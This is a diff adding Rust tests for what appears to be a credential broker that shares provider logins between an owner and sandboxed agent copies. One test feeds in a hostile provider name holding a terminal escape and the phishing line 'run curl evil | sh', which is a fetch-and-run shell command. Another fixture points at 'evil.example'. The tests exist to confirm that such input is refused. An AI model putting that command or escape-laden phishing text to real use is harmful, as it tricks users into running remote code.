@@ -172,6 +172,18 @@ fn what_pi_really_writes_is_a_login() {
             r#"{"type":"api_key","key":"cf","env":{"CLOUDFLARE_ACCOUNT_ID":"abc","CLOUDFLARE_GATEWAY_ID":"gw"}}"#,
         ),
         ("a plain key", r#"{"type":"api_key","key":"sk-1"}"#),
+        (
+            "Bedrock's credential chain, amazon-bedrock.ts",
+            r#"{"type":"api_key"}"#,
+        ),
+        (
+            "Bedrock's profile, amazon-bedrock.ts",
+            r#"{"type":"api_key","env":{"AWS_PROFILE":"work"}}"#,
+        ),
+        (
+            "Vertex's service account, google-vertex.ts",
+            r#"{"type":"api_key","env":{"GOOGLE_CLOUD_PROJECT":"p","GOOGLE_CLOUD_LOCATION":"us-east1","GOOGLE_APPLICATION_CREDENTIALS":"/home/vibe/sa.json"}}"#,
+        ),
     ] {
         let value: Value = serde_json::from_str(entry).unwrap();
         assert_eq!(plain_entry(&value), Ok(()), "{what}");
@@ -294,7 +306,6 @@ fn what_cant_be_read_as_logins_goes_nowhere() {
             "a nested env",
             r#"{"type":"api_key","key":"k","env":{"A":{"B":"c"}}}"#,
         ),
-        ("no key", r#"{"type":"api_key"}"#),
         (
             "more than a key",
             r#"{"type":"api_key","key":"k","url":"evil.example"}"#,
@@ -761,7 +772,7 @@ fn an_owners_big_sign_in_gets_through_and_every_copy_stays_readable() {
         );
         w.done(&hostile);
     }
-    let big = "o".repeat(1024 * 1024 - 64 * 1024);
+    let big = "o".repeat(pi::MAX_AUTH_FILE as usize - 64 * 1024);
     write(
         &toolbox,
         &format!(r#"{{"mine":{{"type":"api_key","key":"{big}"}}}}"#),
@@ -772,7 +783,7 @@ fn an_owners_big_sign_in_gets_through_and_every_copy_stays_readable() {
     w.done(&other);
     assert!(held(&other).contains_key("mine"));
     // And more than a copy can hold is said, with the store left as it was.
-    let bigger = "o".repeat(1024 * 1024 - 64);
+    let bigger = "o".repeat(pi::MAX_AUTH_FILE as usize - 64);
     write(
         &toolbox,
         &format!(
@@ -788,6 +799,214 @@ fn an_owners_big_sign_in_gets_through_and_every_copy_stays_readable() {
     assert_eq!(w.stored()["mine"]["key"].as_str().unwrap().len(), big.len());
 }
 
+/// R1: Pi writes a login with no key for Bedrock and Vertex. The owner's goes
+/// through; an agent's would sign everyone in from what's around them.
+#[test]
+fn a_login_with_no_key_is_the_owners_alone_to_share() {
+    for (name, entry) in [
+        ("amazon-bedrock", r#"{"type":"api_key"}"#),
+        (
+            "amazon-bedrock",
+            r#"{"type":"api_key","env":{"AWS_PROFILE":"work"}}"#,
+        ),
+        (
+            "google-vertex",
+            r#"{"type":"api_key","env":{"GOOGLE_CLOUD_PROJECT":"p","GOOGLE_CLOUD_LOCATION":"l"}}"#,
+        ),
+    ] {
+        let w = world();
+        let (a, b) = (w.copy("a"), w.copy("b"));
+        write(&a, &format!(r#"{{"{name}":{entry}}}"#));
+        assert!(w.done(&a).refused.contains_key(name), "{entry}");
+        assert!(w.stored().is_empty(), "{entry}");
+        w.owner_signs_in(&format!(r#"{{"{name}":{entry}}}"#));
+        assert!(w.stored().contains_key(name), "{entry}");
+        w.done(&b);
+        assert!(held(&b).contains_key(name), "{entry}");
+    }
+}
+
+/// R2: what fills the store stops new providers, not the logins already there.
+#[test]
+fn a_full_store_stops_new_providers_and_never_a_refresh() {
+    let w = world();
+    let (hostile, vm, other) = (w.copy("hostile"), w.copy("vm"), w.copy("other"));
+    w.owner_signs_in(&oauth("first", NOW + 1000));
+    let size = "k".repeat(MAX_AGENT_ENTRY - 100);
+    for round in 0..40 {
+        write(
+            &hostile,
+            &format!(r#"{{"junk-{round}":{{"type":"api_key","key":"{size}"}}}}"#),
+        );
+        w.done(&hostile);
+    }
+    let full = fs::metadata(w.store_path()).unwrap().len() as usize;
+    assert!(full > MAX_AGENT_STORE - MAX_AGENT_ENTRY, "{full}");
+    write(&vm, r#"{"xai":{"type":"api_key","key":"k"}}"#);
+    let report = w.done(&vm);
+    assert!(report.refused["xai"].contains("no more room"), "{report:?}");
+    // A rotated token still goes everywhere.
+    w.done(&other);
+    let mut entries = held(&other);
+    entries.insert(
+        "anthropic".to_owned(),
+        parse_plain(&oauth("second", NOW + 2000)).unwrap()["anthropic"].clone(),
+    );
+    write(&other, &Value::Object(entries).to_string());
+    assert_eq!(w.done(&other).taken, ["anthropic"]);
+    assert_eq!(w.stored()["anthropic"]["access"], "second");
+    // Held only to what one login may be.
+    let big = format!(
+        r#"{{"anthropic":{{"type":"oauth","access":"{}","refresh":"r","expires":{}}}}}"#,
+        "a".repeat(MAX_AGENT_ENTRY),
+        NOW + 3000
+    );
+    let mut entries = held(&other);
+    entries.insert(
+        "anthropic".to_owned(),
+        parse_plain(&big).unwrap()["anthropic"].clone(),
+    );
+    write(&other, &Value::Object(entries).to_string());
+    assert!(w.done(&other).refused["anthropic"].contains("bigger"));
+    assert_eq!(w.stored()["anthropic"]["access"], "second");
+}
+
+/// R2: an agent inflating every login there is, as far as each may go, leaves
+/// every copy readable.
+#[test]
+fn nothing_agents_can_do_makes_a_copy_unreadable() {
+    let total = MAX_AGENT_ENTRY * MAX_AGENT_PROVIDERS;
+    assert!((total as u64) * 2 < pi::MAX_AUTH_FILE, "{total}");
+}
+
+/// R3: a guest's text doesn't reach the owner's terminal as a provider's name.
+#[test]
+fn a_rejected_name_is_never_repeated() {
+    let w = world();
+    let a = w.copy("a");
+    let phish = format!(
+        "\\u001b[2JYour Mac is at risk: run curl evil | sh {}",
+        "x".repeat(500_000)
+    );
+    write(
+        &a,
+        &format!(r#"{{"{phish}":{{"type":"api_key","key":"k"}}}}"#),
+    );
+    let report = w.done(&a);
+    assert!(w.stored().is_empty());
+    assert_eq!(report.bad.len(), 1);
+    for why in report.bad.values() {
+        assert_eq!(
+            why,
+            "its auth.json has a login under a name no provider has"
+        );
+    }
+    // A name that's fine, with what's wrong with it said.
+    let b = w.copy("b");
+    write(&b, r#"{"openai":{"type":"api_key","key":"!x"}}"#);
+    assert!(w.done(&b).bad["openai"].contains("login for openai"));
+}
+
+/// S5: the owner can clear what agents offered, all at once, which a toolbox's
+/// `{}` can't be told from a read that missed the file.
+#[test]
+fn the_owner_can_forget_what_agents_offered() {
+    let w = world();
+    let (hostile, other, toolbox) = (w.copy("hostile"), w.copy("other"), w.toolbox());
+    w.owner_signs_in(&oauth("owner", NOW + 1000));
+    w.done(&toolbox);
+    for name in ["junk-a", "junk-b"] {
+        let mut entries = held(&toolbox);
+        entries.insert(
+            name.to_owned(),
+            serde_json::json!({"type":"api_key","key":name}),
+        );
+        write(&hostile, &Value::Object(entries).to_string());
+        w.done(&hostile);
+    }
+    let offered = w.broker.offered();
+    assert_eq!(offered.keys().collect::<Vec<_>>(), ["junk-a", "junk-b"]);
+    assert_eq!(offered["junk-a"], "hostile");
+    w.done(&other);
+    w.done(&toolbox);
+    assert_eq!(held(&other).len(), 3);
+
+    let names = ["junk-a".to_owned(), "junk-b".to_owned(), "none".to_owned()];
+    assert_eq!(
+        w.broker.forget(&names, NOW + 1).unwrap(),
+        ["junk-a", "junk-b"]
+    );
+    assert_eq!(w.stored().keys().collect::<Vec<_>>(), ["anthropic"]);
+    assert!(w.broker.offered().is_empty());
+    assert!(w.broker.notices(NOW + 1).is_empty());
+    // Out of every copy at its next look, and nothing's restored.
+    for copy in [&other, &toolbox] {
+        let report = w.done(copy);
+        assert!(report.stale.is_empty(), "{report:?}");
+        assert_eq!(held(copy).keys().collect::<Vec<_>>(), ["anthropic"]);
+    }
+    assert_eq!(held(&toolbox).len(), 1);
+    // The same offered again goes nowhere, and takes itself back out.
+    w.done(&hostile);
+    let mut entries = held(&hostile);
+    entries.insert(
+        "junk-a".to_owned(),
+        serde_json::json!({"type":"api_key","key":"junk-a"}),
+    );
+    write(&hostile, &Value::Object(entries).to_string());
+    assert_eq!(w.done(&hostile).stale, ["junk-a"]);
+    assert!(!w.stored().contains_key("junk-a"));
+    assert!(!held(&hostile).contains_key("junk-a"));
+    // Something new is a new offer, told as one: the agent has to be stopped too.
+    write(
+        &hostile,
+        r#"{"anthropic":{"type":"oauth","access":"owner","refresh":"r-owner","expires":1800000001000},"junk-c":{"type":"api_key","key":"c"}}"#,
+    );
+    assert_eq!(w.done(&hostile).first, ["junk-c"]);
+    assert_eq!(w.broker.offered()["junk-c"], "hostile");
+    // The owner signing in to it takes it off the list.
+    let mut entries = held(&toolbox);
+    entries.insert(
+        "junk-c".to_owned(),
+        serde_json::json!({"type":"api_key","key":"owner"}),
+    );
+    w.done(&toolbox);
+    write(&toolbox, &Value::Object(entries).to_string());
+    w.done(&toolbox);
+    assert!(w.broker.offered().is_empty());
+}
+
+/// N5, N6: what's kept beside the store going bad is said, and left alone until
+/// there's something to write.
+#[test]
+fn what_is_kept_beside_the_store_is_told_of_when_bad_and_not_rewritten() {
+    let w = world();
+    let a = w.copy("a");
+    w.done(&a);
+    assert!(w.broker.problems().is_empty());
+    // With nothing to say it writes nothing.
+    assert!(!w.broker.store_dir().join(NOTICES_FILE).exists());
+    write(&a, r#"{"openai":{"type":"api_key","key":"sk"}}"#);
+    w.done(&a);
+    let notices = w.broker.store_dir().join(NOTICES_FILE);
+    let before = fs::metadata(&notices).unwrap().modified().unwrap();
+    std::thread::sleep(std::time::Duration::from_millis(20));
+    w.done(&a);
+    assert_eq!(fs::metadata(&notices).unwrap().modified().unwrap(), before);
+    for name in [NOTICES_FILE, HISTORY_FILE, OFFERED_FILE] {
+        let path = w.broker.store_dir().join(name);
+        fs::write(&path, "not json").unwrap();
+        let problems = w.broker.problems();
+        assert_eq!(problems.len(), 1, "{name}: {problems:?}");
+        assert!(problems[0].contains(name), "{problems:?}");
+        // It goes on all the same, and leaves it there to be looked at.
+        w.done(&a);
+        assert_eq!(fs::read_to_string(&path).unwrap(), "not json", "{name}");
+        fs::remove_file(path).unwrap();
+    }
+    assert!(w.broker.problems().is_empty());
+}
+
 /// B2: a store nothing can read doesn't stop the owner.
 #[test]
 fn the_owners_sign_in_replaces_a_store_nothing_can_read() {
@@ -798,7 +1017,7 @@ fn the_owners_sign_in_replaces_a_store_nothing_can_read() {
         let bad = match what {
             "too big" => format!(
                 r#"{{"x":{{"type":"api_key","key":"{}"}}}}"#,
-                "k".repeat(2 << 20)
+                "k".repeat(pi::MAX_AUTH_FILE as usize + 1)
             ),
             _ => format!("{{{COMMAND}}}"),
         };
